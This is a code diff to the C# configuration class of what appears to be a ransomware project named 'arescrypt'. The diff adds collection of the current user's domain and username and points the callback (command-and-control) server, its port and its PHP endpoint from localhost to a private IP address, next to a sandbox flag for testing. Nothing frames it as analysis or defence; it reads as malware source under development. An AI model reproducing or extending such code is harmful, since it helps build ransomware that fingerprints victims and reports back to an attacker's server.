@@ -2,8 +2,12 @@
 {
     class Configuration
     {
+        // User Specific
         public static string currentWorkingDirectory = System.IO.Path.GetDirectoryName(
             System.Reflection.Assembly.GetExecutingAssembly().Location);
+        public static string sessionDomain = System.Environment.UserDomainName; // get current sessions domain
+        public static string sessionUsername = System.Environment.UserName; // get current sessions username
+        public static string userDomUser = sessionDomain + @"\" + sessionUsername;
 
         // Debugging configuration
         public bool sandBox = true; // Safemode for testing/debugging
@@ -23,7 +27,7 @@
         public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
         // Variables to be set by GetDATFileData()
         // Server Data
-        public static string callbackServer = "localhost";
+        public static string callbackServer = "172.16.1.41";
         public static int callbackPort = 9000;
         public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
